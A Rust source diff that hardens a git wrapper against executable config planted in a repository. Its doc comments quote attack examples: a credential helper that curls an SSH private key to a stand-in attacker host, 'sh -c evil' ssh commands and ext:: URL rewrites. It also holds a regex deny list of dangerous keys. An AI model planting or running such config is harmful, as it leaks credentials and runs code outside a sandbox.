@@ -126,6 +126,139 @@ pub struct GitRepo {
     exec_disable_flags: Option<Vec<String>>,
 }
 
+/// An EMPTY REGULAR FILE this process owns, for `GIT_CONFIG_GLOBAL`.
+///
+/// The obvious spelling is the null device (`/dev/null`, `NUL` on Windows),
+/// and that is what this was. It was never verified that Git for Windows
+/// accepts `NUL` as a config path: Git resolves config paths through its own
+/// POSIX-ish layer, and if it errors instead of reading an empty file then
+/// EVERY engine git call fails on Windows — a total break, not a degrade
+/// (audit 2026-09-01 F-12). An empty file the engine creates itself has no
+/// platform-specific device semantics to get wrong, and it is testable: the
+/// test can stat it.
+///
+/// Created once per process, lazily, on the first hardened invocation:
+/// a randomly named 0700 directory in the system temp dir (`create_dir`
+/// refuses an existing path, so an attacker cannot pre-seat it), holding one
+/// `create_new` 0600 file. `create_new` is what makes the create a claim
+/// rather than a truncate — it fails on a symlink and on any pre-existing
+/// entry, so this can never end up pointed at the operator's real
+/// `~/.gitconfig`.
+///
+/// Failure to create it is a REFUSAL, not a fallback: an invocation that
+/// cannot null the user scope would silently read whatever `~/.gitconfig`
+/// arms, which is the surface this exists to close.
+///
+/// Residual: the directory outlives the process (a static has no `Drop`), so
+/// a long-running host accumulates one empty 4KB directory per kranz process.
+/// Cheap, and the alternative — a predictable reusable path — trades that for
+/// a pre-seating race.
+fn empty_global_config_path() -> Result<&'static Path> {
+    static PATH: std::sync::OnceLock<std::result::Result<PathBuf, String>> =
+        std::sync::OnceLock::new();
+    match PATH.get_or_init(create_empty_global_config) {
+        Ok(path) => Ok(path.as_path()),
+        Err(detail) => Err(EngineError::Git(format!(
+            "refusing to run git without a neutralized user config: {detail}"
+        ))),
+    }
+}
+
+fn create_empty_global_config() -> std::result::Result<PathBuf, String> {
+    let dir = std::env::temp_dir().join(format!("kranz-gitconfig-{}", uuid::Uuid::new_v4()));
+    // Built in a block so the binding is `mut` only where a mode is set;
+    // on Windows the `mut` was an unused_mut error under `-D warnings`.
+    let builder = {
+        #[allow(unused_mut)]
+        let mut builder = std::fs::DirBuilder::new();
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::DirBuilderExt as _;
+            builder.mode(0o700);
+        }
+        builder
+    };
+    builder
+        .create(&dir)
+        .map_err(|e| format!("cannot create {}: {e}", dir.display()))?;
+    let path = dir.join("gitconfig");
+    let mut options = std::fs::OpenOptions::new();
+    options.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt as _;
+        options.mode(0o600);
+    }
+    options
+        .open(&path)
+        .map_err(|e| format!("cannot create {}: {e}", path.display()))?;
+    Ok(path)
+}
+
+/// Which config scopes one hardened git invocation reads.
+///
+/// [`UserConfig::Ignored`] is the rule for LOCAL operations (status, add,
+/// commit, checkout, merge, diff, log, worktree): they never contact a
+/// remote, so nothing the operator's `~/.gitconfig` carries is load-bearing
+/// for them, and nulling it removes a whole class of executable config the
+/// enumerated `-c` segment cannot cover.
+///
+/// [`UserConfig::Visible`] exists for the identity reads
+/// ([`GitRepo::ensure_identity`], [`GitRepo::resolved_identity`]), whose
+/// whole job is to resolve the operator's `user.name` / `user.email` from
+/// wherever git would find them — nulling user config there would silently
+/// restamp every engine commit as `kranz <kranz@localhost>`. Those
+/// invocations still carry the `-c` segment, so reading a config value never
+/// executes one.
+///
+/// [`UserConfig::KeptForNetwork`] is for operations that DO contact a remote
+/// (`push`, `ls-remote`). Nulling the user scope there is a functional
+/// regression, not a hardening (audit 2026-09-01 F-11): `credential.helper`
+/// (osxkeychain / manager / gh) is where an https push gets its credential,
+/// `url.<base>.insteadOf` is a widespread operator convention, and
+/// `http.proxy` is how a corporate network is reached at all. So the network
+/// mode keeps the user scope in force and defends the same surface from the
+/// other side — see [`GitRepo::refuse_network_on_armed_local_config`], which
+/// refuses the operation outright when the REPOSITORY's own config (the
+/// scope a worker can write) carries any of those keys.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum UserConfig {
+    Ignored,
+    Visible,
+    KeptForNetwork,
+}
+
+/// The config-scope environment a hardened invocation applies.
+///
+/// The operator's `~/.gitconfig` and `/etc/gitconfig` are further sources of
+/// EXECUTABLE config (`core.hooksPath`, `gpg.program`, filter drivers) that
+/// the enumerated `-c` segment does not cover: the filter enumeration reads
+/// the repository's config, so a driver armed only in a user-scope file would
+/// not be in the list. Nulling both keeps the hardened handle's promise
+/// honest. The idiom mirrors `contract_lint::lint_env`, which does the same
+/// from the other side.
+///
+/// The system scope stays off in EVERY mode, network included:
+/// `/etc/gitconfig` is not where an operator's credential helper or proxy
+/// lives, and on a shared build host it is the one scope a mission host
+/// operator may not control.
+fn hardened_config_env(user_config: UserConfig) -> Result<Vec<(&'static str, OsString)>> {
+    Ok(match user_config {
+        UserConfig::Ignored => vec![
+            ("GIT_CONFIG_NOSYSTEM", OsString::from("1")),
+            (
+                "GIT_CONFIG_GLOBAL",
+                empty_global_config_path()?.as_os_str().to_os_string(),
+            ),
+        ],
+        // GIT_CONFIG_GLOBAL is deliberately NOT set: the operator's
+        // ~/.gitconfig has to stay in force for the credential helper, the
+        // insteadOf rewrites and the proxy that make a push work at all.
+        UserConfig::KeptForNetwork => vec![("GIT_CONFIG_NOSYSTEM", OsString::from("1"))],
+        UserConfig::Visible => Vec::new(),
+    })
+}
+
 /// git on Windows cannot parse VERBATIM paths (`\\?\C:\...`, which
 /// `std::fs::canonicalize` returns there — and the engine canonicalizes
 /// repo roots for the no-follow guards): `git worktree add //?/C:/...`
@@ -146,12 +279,41 @@ fn git_path_arg(path: &Path) -> PathBuf {
 }
 
 impl GitRepo {
-    /// Open `root` as a git repository.
+    /// Open `root` as a git repository, HARDENED.
     ///
     /// Verifies `git rev-parse --git-dir` succeeds inside `root`; returns
     /// [`EngineError::Git`] when `root` is not a repository (or git itself
     /// cannot be invoked).
+    ///
+    /// Every invocation from the returned handle runs with executable git
+    /// configuration disabled — see [`Self::build_exec_disable_flags`] for
+    /// the flag set. This is the DEFAULT because engine-side git runs inside
+    /// the tree the worker controls (audit 2026-09-01 H3): the worker's
+    /// session cwd is the active tree, `.git` is inside its write allowlist,
+    /// and the engine's next checkpoint `git status` / `git add` /
+    /// `git commit` would otherwise execute a planted `pre-commit` hook,
+    /// `core.fsmonitor`, filter driver or `gpg.program` OUTSIDE every sandbox
+    /// with the engine's full ambient environment. Hardening was previously
+    /// opt-in and applied at five sites; the sixteen that did not opt in
+    /// (integration-worktree handle, checkpoint commits, checkout, tag,
+    /// `push_mission_branch`) were the hole.
+    ///
+    /// [`Self::open_unhardened`] is the explicit escape hatch for a caller
+    /// that genuinely needs the repository's own executable config.
     pub fn open(root: impl Into<PathBuf>) -> Result<Self> {
+        let repo = Self::open_unhardened(root)?;
+        repo.with_hooks_disabled()
+    }
+
+    /// Open `root` as a git repository WITHOUT the executable-config
+    /// neutralization [`Self::open`] applies.
+    ///
+    /// There is no engine caller: it exists so a future one that genuinely
+    /// wants the repository's hooks (a deliberate "run the project's own
+    /// pre-commit" feature, say) has to say so at the open site rather than
+    /// getting it by forgetting to opt in. Do not use it on a tree an agent
+    /// can write.
+    pub fn open_unhardened(root: impl Into<PathBuf>) -> Result<Self> {
         let repo = GitRepo {
             root: root.into(),
             exec_disable_flags: None,
@@ -180,6 +342,12 @@ impl GitRepo {
     /// `core.fsmonitor=` while this doc claimed "every executable surface",
     /// leaving planted filter drivers and `gpg.program` executable).
     ///
+    /// [`Self::open`] now returns a hardened handle already, so on an
+    /// ordinary handle this is an IDEMPOTENT no-op clone (kept so the
+    /// existing explicit call sites read as the assertions they are). It
+    /// still does the enumeration when called on an
+    /// [`Self::open_unhardened`] handle.
+    ///
     /// The gated merge path uses this: its scratch worktree's gitdir points
     /// into the primary `.git`, so mission-authored gate/test code can plant
     /// executable config — which the merge's own checkout / merge / worktree
@@ -192,7 +360,7 @@ impl GitRepo {
     /// payload ran first). Opt-in per handle: worker-side git behavior is
     /// deliberately unchanged.
     ///
-    /// Building the handle enumerates the repo's configured filter drivers;
+    /// Building the handle enumerates the repo's configured filter and merge drivers;
     /// an enumeration failure fails CLOSED (no handle) — a verification
     /// handle that cannot name its armed drivers cannot promise the surface
     /// is disabled.
@@ -243,13 +411,55 @@ impl GitRepo {
     ///   forces signing back on (`-S`). `/bin/false` is never resolved
     ///   unless signing actually runs.
     ///
-    /// Documented residual (no overclaim this time): `merge.<name>.driver`
-    /// and `diff.<name>.command`/`.textconv` also execute repo-configured
-    /// commands when an attribute arms them — but only on merge/diff
-    /// porcelain, and an EMPTY override makes those git commands fail
-    /// loudly rather than fall back to the builtin behavior (probed
-    /// 2026-08-04), so neutralizing them is a behavior change of its own,
-    /// not a silent rider on this countermeasure.
+    /// - `credential.helper=` — a repo-local
+    ///   `helper = !sh -c 'curl -d @~/.ssh/id_rsa https://attacker/'` runs
+    ///   the moment git needs a credential, with the engine's environment.
+    ///   An EMPTY helper entry is git's documented list RESET (the `-c`
+    ///   scope is read last, so it clears every helper configured before
+    ///   it), not merely one more empty entry. That is also why this key is
+    ///   dropped for network operations, where the operator's own helper is
+    ///   the point — see [`UserConfig::KeptForNetwork`].
+    /// - `core.sshCommand=` — `[core] sshCommand = sh -c 'evil' --` is
+    ///   executed by every git operation that opens an ssh transport.
+    ///   Dropped for network operations: probed 2026-09-02, an empty
+    ///   `core.sshCommand` does NOT fall back to `ssh`, it makes git try to
+    ///   exec the empty string (`error: cannot run : No such file or
+    ///   directory`), so carrying it would break every ssh remote.
+    /// - `core.askPass=` — same shape for the credential prompt. Safe to
+    ///   carry on network operations: git skips an empty askpass and falls
+    ///   back to the terminal rather than trying to exec it.
+    /// - `core.editor=` / `sequence.editor=` — the engine never wants an
+    ///   editor (every commit is `-m`), so an armed one can only be a
+    ///   payload waiting for a git command that would spawn it.
+    /// - `uploadpack.packObjectsHook=` — runs on the SERVING side of a
+    ///   fetch. A worker that plants it turns "someone fetches from this
+    ///   checkout" into code execution.
+    /// - `protocol.ext.allow=never` — `ext::` remote URLs execute their
+    ///   argument as a command. This shuts the transport off rather than
+    ///   trying to sanitize URLs.
+    /// - `remote.<name>.uploadpack=` / `.receivepack=` for every remote
+    ///   named in the repo's config: both name a program git runs on the
+    ///   far side, and a local remote (`/path/to/repo`) makes "far side"
+    ///   mean this machine.
+    ///
+    /// ## `url.<base>.insteadOf` is REFUSED, not blanked
+    ///
+    /// The audit asked for enumerate-and-blank here too. Probed 2026-09-02,
+    /// blanking is worse than doing nothing: `insteadOf` is MULTI-VALUED, so
+    /// `-c url.<base>.insteadOf=` appends an entry rather than replacing the
+    /// planted one — the planted rewrite still fires — and the appended
+    /// entry is the EMPTY prefix, which `starts_with` matches against every
+    /// URL. On a repo with no rewrite at all, adding the blank turned
+    /// `https://github.com/foo/bar.git` into
+    /// `ext::sh -c evil %Shttps://github.com/foo/bar.git`. There is no
+    /// command-line spelling that unsets a config key, so the flag set
+    /// cannot neutralize this surface. Only operations that resolve a remote
+    /// URL consult it, and those all go through
+    /// [`Self::refuse_network_on_armed_local_config`], which refuses them.
+    ///
+    /// Verification diffs pass `--no-ext-diff --no-textconv`; custom merge
+    /// drivers fail closed. Worker-authored configuration must not execute
+    /// outside its sandbox during an engine diff or merge.
     fn build_exec_disable_flags(&self) -> Result<Vec<String>> {
         const BASE: &[&str] = &[
             "core.hooksPath=",
@@ -257,8 +467,16 @@ impl GitRepo {
             "core.attributesFile=/dev/null",
             "commit.gpgSign=false",
             "gpg.program=/bin/false",
+            "merge.default=text",
+            CREDENTIAL_HELPER_RESET,
+            SSH_COMMAND_OVERRIDE,
+            "core.askPass=",
+            "core.editor=",
+            "sequence.editor=",
+            "uploadpack.packObjectsHook=",
+            "protocol.ext.allow=never",
         ];
-        let mut flags = Vec::with_capacity(BASE.len() * 2 + 8);
+        let mut flags = Vec::with_capacity(BASE.len() * 2 + 16);
         for kv in BASE {
             flags.push("-c".to_string());
             flags.push((*kv).to_string());
@@ -271,7 +489,30 @@ impl GitRepo {
             flags.push("-c".to_string());
             flags.push(format!("filter.{name}.required=false"));
         }
+        for name in self.enumerated_subsections("^merge\\..*\\.driver$", "merge.")? {
+            flags.push("-c".to_string());
+            flags.push(format!("merge.{name}.driver=false"));
+        }
+        for name in self.configured_remote_programs()? {
+            for sub in ["uploadpack", "receivepack"] {
+                flags.push("-c".to_string());
+                flags.push(format!("remote.{name}.{sub}="));
+            }
+        }
         Ok(flags)
+    }
+
+    /// Remotes whose config names a program to run on the far side
+    /// (`remote.<name>.uploadpack` / `.receivepack`), for
+    /// [`Self::build_exec_disable_flags`]' blanking overrides. Both keys are
+    /// single-valued, so an empty `-c` override really does replace the
+    /// planted value (probed 2026-09-02) — unlike `insteadOf`.
+    ///
+    /// Enumeration failures fail CLOSED, for the same reason the filter
+    /// enumeration does: a handle that cannot name the armed programs cannot
+    /// promise the surface is disabled.
+    fn configured_remote_programs(&self) -> Result<Vec<String>> {
+        self.enumerated_subsections("^remote\\..*\\.(uploadpack|receivepack)$", "remote.")
     }
 
     /// The filter-driver names configured for this repository (any config
@@ -288,7 +529,21 @@ impl GitRepo {
     /// (`filter.weird.name.clean`) re-split at the LAST dot, so they
     /// round-trip into `-c` keys exactly as git prints them.
     fn configured_filter_drivers(&self) -> Result<Vec<String>> {
-        let out = self.probe(&["config", "--get-regexp", "-z", "^filter\\."])?;
+        self.enumerated_subsections("^filter\\.", "filter.")
+    }
+
+    /// The subsection names of every config key matching `pattern`, with
+    /// `prefix` stripped and the trailing subkey removed — the shared body
+    /// of [`Self::configured_filter_drivers`] and
+    /// [`Self::configured_remote_programs`].
+    ///
+    /// Runs on this handle, so under [`UserConfig::Ignored`]: the user and
+    /// system scopes are already nulled for it, which is what makes the
+    /// enumeration REPO-LOCAL without needing `--local` (and therefore
+    /// covers `.git/config`, a `config.worktree`, and a linked worktree's
+    /// gitdir config in one read — probed 2026-09-02).
+    fn enumerated_subsections(&self, pattern: &str, prefix: &str) -> Result<Vec<String>> {
+        let out = self.probe(&["config", "--get-regexp", "-z", pattern])?;
         if !out.status.success() {
             // Exit 1 is "no matches" (the common case); anything else is a
             // real failure and must not silently yield an unneutralized set.
@@ -296,7 +551,7 @@ impl GitRepo {
                 return Ok(Vec::new());
             }
             return Err(EngineError::Git(format!(
-                "git config --get-regexp filter.* failed ({}): {}",
+                "git config --get-regexp {pattern} failed ({}): {}",
                 out.status,
                 failure_detail(&out)
             )));
@@ -308,7 +563,7 @@ impl GitRepo {
                 continue;
             }
             let key = entry.split('\n').next().unwrap_or("");
-            let Some(rest) = key.strip_prefix("filter.") else {
+            let Some(rest) = key.strip_prefix(prefix) else {
                 continue;
             };
             let Some((name, _subkey)) = rest.rsplit_once('.') else {
@@ -320,6 +575,89 @@ impl GitRepo {
             names.insert(name.to_string());
         }
         Ok(names.into_iter().collect())
+    }
+
+    /// Refuse a NETWORK operation when the REPOSITORY's own config carries a
+    /// key that names a program, a credential source, or a URL rewrite.
+    ///
+    /// This is the network half of the H3 hardening, and the reason
+    /// [`UserConfig::KeptForNetwork`] can afford to leave the operator's
+    /// `~/.gitconfig` in force. The two scopes are not equally trusted:
+    /// `~/.gitconfig` is the operator's, while `<repo>/.git/config` is
+    /// inside the worker's write allowlist. A `credential.helper` or an
+    /// `ext::` rewrite appearing in the scope a worker controls is an ATTACK
+    /// SIGNAL, not a configuration to work around — so the push is refused
+    /// rather than sanitized, and the error names every offending key.
+    ///
+    /// Only keys are named, never values: a planted `http.proxy` or
+    /// `credential.<url>.username` can carry a secret, and the refusal goes
+    /// to mission logs.
+    ///
+    /// Failing to read the config is itself a refusal: a network operation
+    /// that cannot rule the repo scope out has not ruled it out.
+    fn refuse_network_on_armed_local_config(&self) -> Result<()> {
+        if self.exec_disable_flags.is_none() {
+            // An unhardened handle is the explicit escape hatch
+            // ([`Self::open_unhardened`]): it promises nothing, and this
+            // read could not tell the repo scope from the operator's anyway,
+            // because nothing is nulling the global scope for it.
+            return Ok(());
+        }
+        // Each pattern is matched against the key git prints, which lowercases
+        // the section and the final subkey but preserves a subsection's case
+        // (probed 2026-09-02) — hence `sshcommand`, `insteadof`.
+        const ARMED: &str = "^(credential\\.\
+             |core\\.sshcommand$\
+             |core\\.askpass$\
+             |core\\.gitproxy$\
+             |protocol\\.\
+             |http\\.(proxy|sslcainfo|sslcert|sslkey)$\
+             |url\\..*\\.(insteadof|pushinsteadof)$\
+             |remote\\..*\\.(uploadpack|receivepack)$)";
+        // Deliberately NOT `self.probe`: the handle's own `-c` segment sets
+        // `credential.helper=` and `protocol.ext.allow=never`, and
+        // `--get-regexp` would report those command-line values as matches
+        // and refuse every push. Nulling the global scope by env is what
+        // makes this read see exactly the repository's own config.
+        let out = self.spawn_git(
+            &["config", "--get-regexp", "-z", ARMED]
+                .iter()
+                .map(OsString::from)
+                .collect::<Vec<_>>(),
+            UserConfig::Ignored,
+            ExecFlags::None,
+        )?;
+        if !out.status.success() {
+            if out.status.code() == Some(1) {
+                // Exit 1 is "no matches": the repository scope is clean.
+                return Ok(());
+            }
+            return Err(EngineError::Git(format!(
+                "refusing a network git operation: cannot read this repository's \
+                 own config to rule out a planted credential helper ({}): {}",
+                out.status,
+                failure_detail(&out)
+            )));
+        }
+        let stdout = String::from_utf8_lossy(&out.stdout);
+        let mut offenders = std::collections::BTreeSet::new();
+        for entry in stdout.split('\0') {
+            if entry.is_empty() {
+                continue;
+            }
+            offenders.insert(entry.split('\n').next().unwrap_or("").to_string());
+        }
+        if offenders.is_empty() {
+            return Ok(());
+        }
+        Err(EngineError::Git(format!(
+            "refusing a network git operation: this repository's own config sets \
+             {} — a credential helper, ssh command, URL rewrite or transport hook \
+             in the scope a worker can write is an attack signal, not a setting. \
+             Remove the key from .git/config (or .git/config.worktree) and re-run; \
+             the operator's own ~/.gitconfig is untouched and still in force.",
+            offenders.into_iter().collect::<Vec<_>>().join(", ")
+        )))
     }
 
     /// Sha of `HEAD` (`git rev-parse HEAD`).
@@ -490,7 +828,7 @@ impl GitRepo {
             return Ok(false);
         }
         Ok(self
-            .run(&["ls-files", "-v", "-f"])?
+            .run_seeing_fsmonitor(&["ls-files", "-v", "-f"])?
             .lines()
             .all(|line| line.starts_with("H ")))
     }
@@ -500,9 +838,29 @@ impl GitRepo {
     /// hide worktree bytes from ordinary diff/status commands and must not
     /// guard a trust decision.
     pub fn has_normal_index_entry(&self, path: &str) -> Result<bool> {
-        let output = self.run(&["ls-files", "-v", "-f", "--", path])?;
+        let output = self.run_seeing_fsmonitor(&["ls-files", "-v", "-f", "--", path])?;
         let mut lines = output.lines();
         Ok(lines.next() == Some(format!("H {path}").as_str()) && lines.next().is_none())
+    }
+
+    /// `git ls-files` for the two index-flag DETECTIONS above, run with the
+    /// repository's own `core.fsmonitor` setting left visible.
+    ///
+    /// The hardened handle neutralizes `core.fsmonitor=` because `git status`
+    /// would otherwise execute a planted hook. But git only reports the
+    /// fsmonitor-valid tag (`h`) when fsmonitor is CONFIGURED: with the key
+    /// blanked, `ls-files -f` prints the ordinary `H` and the detection reads
+    /// a flag-hidden file as clean — which is precisely the trust decision
+    /// these two callers exist to refuse. `ls-files` reads the index without
+    /// refreshing it and never invokes the hook (probed 2026-09-02: a
+    /// `core.fsmonitor` script pointed at a sentinel is not run by
+    /// `ls-files -f`), so keeping this one key visible costs nothing. Every
+    /// other neutralization, and the nulled user/system config, stay in
+    /// place.
+    fn run_seeing_fsmonitor(&self, args: &[&str]) -> Result<String> {
+        let os: Vec<OsString> = args.iter().map(OsString::from).collect();
+        let out = self.spawn_git(&os, UserConfig::Ignored, ExecFlags::SeeingFsmonitor)?;
+        check_status(&os, out)
     }
 
     /// `git add -A` then `git commit -m <message>`; returns the new head sha.
@@ -1505,7 +1863,10 @@ impl GitRepo {
                 )));
             }
         }
-        let out = self.probe(&["ls-remote", "--heads", remote, branch])?;
+        // Network mode: the operator's ~/.gitconfig stays in force (an
+        // ls-remote against an https host needs the same credential helper a
+        // push does) and this repo's own config is pre-flighted first.
+        let out = self.probe_network(&["ls-remote", "--heads", remote, branch])?;
         if !out.status.success() {
             return Err(EngineError::Git(format!(
                 "git ls-remote --heads {remote} {branch} failed ({}): {}",
@@ -1582,23 +1943,47 @@ impl GitRepo {
         }
         // Plain push of one local branch to the same-named remote branch.
         // Never --force; never a refspec; never main.
-        self.run(&["push", remote, branch])?;
+        //
+        // Network mode ([`Self::run_network`]): the tree being pushed is the
+        // one the worker just wrote, so this refuses outright if the
+        // repository's own config carries a credential helper, an ssh
+        // command, a URL rewrite or a transport hook — while leaving the
+        // operator's `~/.gitconfig` in force, which is what makes an https
+        // push find a credential at all.
+        self.run_network(&["push", remote, branch])?;
         Ok(())
     }
 
-    /// Guarantee commits can be made: when `user.name` / `user.email` resolve
-    /// to nothing for this repo (any config scope), set a local identity of
-    /// `kranz <kranz@localhost>`. Existing identities are never overwritten,
-    /// and missions never fail on hosts without a global git identity.
+    /// Guarantee commits can be made: PIN `user.name` / `user.email` into the
+    /// repo's LOCAL config when they are not already set there — to whatever
+    /// the operator's config resolves them to, falling back to
+    /// `kranz <kranz@localhost>` when nothing resolves at all. A local
+    /// identity is never overwritten, and missions never fail on hosts
+    /// without a global git identity.
+    ///
+    /// Pinning into local scope (rather than only writing the fallback pair
+    /// when nothing resolved) is what keeps commit authorship unchanged now
+    /// that hardened invocations no longer read the operator's `~/.gitconfig`
+    /// (audit H3 hardening, [`UserConfig::Ignored`]): without it, every
+    /// engine commit on a host whose identity lives only in the global file
+    /// would silently be restamped `kranz <kranz@localhost>`.
     pub fn ensure_identity(&self) -> Result<()> {
-        for (key, value) in [("user.name", "kranz"), ("user.email", "kranz@localhost")] {
-            let probe = self.probe(&["config", "--get", key])?;
-            let already_set =
-                probe.status.success() && !String::from_utf8_lossy(&probe.stdout).trim().is_empty();
-            if !already_set {
-                // `git config <key> <value>` writes to the local repo config.
-                self.run(&["config", key, value])?;
+        for (key, fallback) in [("user.name", "kranz"), ("user.email", "kranz@localhost")] {
+            let local = self.probe(&["config", "--local", "--get", key])?;
+            let set_locally =
+                local.status.success() && !String::from_utf8_lossy(&local.stdout).trim().is_empty();
+            if set_locally {
+                continue;
             }
+            let resolved = self.probe_with_user_config(&["config", "--get", key])?;
+            let value = String::from_utf8_lossy(&resolved.stdout).trim().to_string();
+            let value = if resolved.status.success() && !value.is_empty() {
+                value
+            } else {
+                fallback.to_string()
+            };
+            // `git config <key> <value>` writes to the local repo config.
+            self.run(&["config", key, &value])?;
         }
         Ok(())
     }
@@ -1615,7 +2000,7 @@ impl GitRepo {
     /// `runner::seed_worker_env`).
     pub fn resolved_identity(&self) -> Result<(String, String)> {
         let resolve = |key: &str, fallback: &str| -> Result<String> {
-            let probe = self.probe(&["config", "--get", key])?;
+            let probe = self.probe_with_user_config(&["config", "--get", key])?;
             let value = String::from_utf8_lossy(&probe.stdout).trim().to_string();
             if probe.status.success() && !value.is_empty() {
                 Ok(value)
@@ -1638,15 +2023,71 @@ impl GitRepo {
     }
 
     fn probe_os(&self, args: &[OsString]) -> Result<Output> {
+        self.spawn_git(args, UserConfig::Ignored, ExecFlags::All)
+    }
+
+    /// [`Self::probe`] for the two identity reads that MUST still see the
+    /// operator's `~/.gitconfig` (see [`UserConfig::Visible`]).
+    fn probe_with_user_config(&self, args: &[&str]) -> Result<Output> {
+        let os: Vec<OsString> = args.iter().map(OsString::from).collect();
+        self.spawn_git(&os, UserConfig::Visible, ExecFlags::All)
+    }
+
+    /// Run a git operation that CONTACTS A REMOTE, demanding success.
+    ///
+    /// Two things differ from [`Self::run`], and they are the same decision
+    /// seen from two sides (audit 2026-09-01 F-11): the operator's
+    /// `~/.gitconfig` stays in force (without it an https push has no
+    /// credential source and an `insteadOf` convention silently sends the
+    /// push to the un-rewritten URL), and the repository's own config — the
+    /// scope a worker can write — is pre-flighted first and the operation
+    /// refused if it carries anything that names a program, a credential, or
+    /// a URL rewrite.
+    fn run_network(&self, args: &[&str]) -> Result<String> {
+        self.refuse_network_on_armed_local_config()?;
+        let os: Vec<OsString> = args.iter().map(OsString::from).collect();
+        let out = self.spawn_git(&os, UserConfig::KeptForNetwork, ExecFlags::NetworkSafe)?;
+        check_status(&os, out)
+    }
+
+    /// [`Self::run_network`] without the success demand, for network probes.
+    fn probe_network(&self, args: &[&str]) -> Result<Output> {
+        self.refuse_network_on_armed_local_config()?;
+        let os: Vec<OsString> = args.iter().map(OsString::from).collect();
+        self.spawn_git(&os, UserConfig::KeptForNetwork, ExecFlags::NetworkSafe)
+    }
+
+    fn spawn_git(
+        &self,
+        args: &[OsString],
+        user_config: UserConfig,
+        exec_flags: ExecFlags,
+    ) -> Result<Output> {
         let mut cmd = Command::new("git");
         if let Some(flags) = &self.exec_disable_flags {
             // `-c` must precede the subcommand; the segment neutralizes every
             // executable config surface this handle promises to cover (see
             // with_hooks_disabled / build_exec_disable_flags).
-            cmd.args(flags);
+            cmd.args(exec_flags.select(flags));
+            // `-c` overrides only the keys it names. `GIT_CONFIG_PARAMETERS`
+            // and a `GIT_CONFIG_COUNT` triple inherited from the engine's own
+            // environment would inject further config UNDER those overrides,
+            // so they are cleared on every hardened invocation regardless of
+            // scope (the idiom `contract_lint::lint_env` uses from the other
+            // side).
+            cmd.env_remove("GIT_CONFIG_PARAMETERS");
+            cmd.env_remove("GIT_CONFIG_COUNT");
+            for (key, value) in hardened_config_env(user_config)? {
+                cmd.env(key, value);
+            }
         }
-        cmd.args(args)
-            .current_dir(&self.root)
+        if self.exec_disable_flags.is_some() && args.first().is_some_and(|arg| arg == "diff") {
+            cmd.args(["diff", "--no-ext-diff", "--no-textconv"])
+                .args(&args[1..]);
+        } else {
+            cmd.args(args);
+        }
+        cmd.current_dir(&self.root)
             .stdin(Stdio::null())
             .output()
             .map_err(|e| {
@@ -1662,16 +2103,73 @@ impl GitRepo {
 
     fn run_os(&self, args: &[OsString]) -> Result<String> {
         let out = self.probe_os(args)?;
-        if out.status.success() {
-            Ok(String::from_utf8_lossy(&out.stdout).into_owned())
-        } else {
-            Err(EngineError::Git(format!(
-                "git {} failed ({}): {}",
-                render_args(args),
-                out.status,
-                failure_detail(&out)
-            )))
+        check_status(args, out)
+    }
+}
+
+/// Which entries of a hardened handle's `-c` segment one invocation carries.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ExecFlags {
+    /// The whole segment. Every local operation.
+    All,
+    /// The segment minus the entries that break a REAL remote: an empty
+    /// `core.sshCommand` makes git exec the empty string instead of falling
+    /// back to `ssh` (probed 2026-09-02), and an empty `credential.helper`
+    /// resets away the operator's own helper. The surface those two cover in
+    /// the repo scope is closed by
+    /// [`GitRepo::refuse_network_on_armed_local_config`] instead.
+    NetworkSafe,
+    /// The segment minus `core.fsmonitor=`, for the two index-flag
+    /// detections (see [`GitRepo::run_seeing_fsmonitor`]).
+    SeeingFsmonitor,
+    /// No `-c` entries at all — the config read that decides whether a
+    /// network operation may run, which must observe the REPOSITORY's config
+    /// rather than the overrides this handle is about to apply.
+    None,
+}
+
+/// `-c` entry that resets git's credential-helper list (an empty helper is
+/// git's documented reset, and the command-line scope is read last).
+const CREDENTIAL_HELPER_RESET: &str = "credential.helper=";
+/// `-c` entry that blanks a planted `core.sshCommand`.
+const SSH_COMMAND_OVERRIDE: &str = "core.sshCommand=";
+
+impl ExecFlags {
+    /// The `-c key=value` pairs this mode keeps out of `flags` (which is
+    /// always a flat `["-c", kv, "-c", kv, ...]`).
+    fn select(self, flags: &[String]) -> Vec<String> {
+        let drop = |kv: &str| match self {
+            ExecFlags::All => false,
+            ExecFlags::NetworkSafe => kv == CREDENTIAL_HELPER_RESET || kv == SSH_COMMAND_OVERRIDE,
+            ExecFlags::SeeingFsmonitor => kv == "core.fsmonitor=",
+            ExecFlags::None => true,
+        };
+        let mut kept = Vec::with_capacity(flags.len());
+        let mut i = 0;
+        while i + 1 < flags.len() {
+            let (flag, kv) = (&flags[i], &flags[i + 1]);
+            i += 2;
+            if flag == "-c" && drop(kv) {
+                continue;
+            }
+            kept.push(flag.clone());
+            kept.push(kv.clone());
         }
+        kept
+    }
+}
+
+/// Turn a finished git `Output` into stdout-on-success / [`EngineError::Git`].
+fn check_status(args: &[OsString], out: Output) -> Result<String> {
+    if out.status.success() {
+        Ok(String::from_utf8_lossy(&out.stdout).into_owned())
+    } else {
+        Err(EngineError::Git(format!(
+            "git {} failed ({}): {}",
+            render_args(args),
+            out.status,
+            failure_detail(&out)
+        )))
     }
 }
 
@@ -1892,8 +2390,10 @@ mod tests {
 
         // The engine's checkpoint path (commit_dirty_paths is what the pool
         // checkpoint and the sequential dirty-tree turn call): the driver
-        // must NOT execute, and the staged bytes must be verbatim.
-        let repo = GitRepo::open(&root).unwrap().with_hooks_disabled().unwrap();
+        // must NOT execute, and the staged bytes must be verbatim. The handle
+        // is a PLAIN `GitRepo::open` — hardening is the default now (audit
+        // H3), and this test is what proves the default carries it.
+        let repo = GitRepo::open(&root).unwrap();
         std::fs::write(root.join("deliverable.txt"), "exact bytes ✓\n").unwrap();
         match repo.commit_dirty_paths("checkpoint").unwrap() {
             CheckpointOutcome::Committed(_) => {}
@@ -1914,6 +2414,73 @@ mod tests {
         // argv segment, never a duplicated or re-enumerated one.
         let rewrapped = repo.with_hooks_disabled().unwrap();
         assert_eq!(repo.exec_disable_flags, rewrapped.exec_disable_flags);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn git_exec_config_planted_textconv_never_runs_on_checkpoint_diff() {
+        let dir = tempfile::tempdir().unwrap();
+        let (root, payload, log) = git_exec_config_repo(
+            &dir,
+            "#!/bin/sh\necho textconv-ran >> '__LOG__'\ncat \"$1\"\n",
+        );
+        let raw = GitRepo::open_unhardened(&root).unwrap();
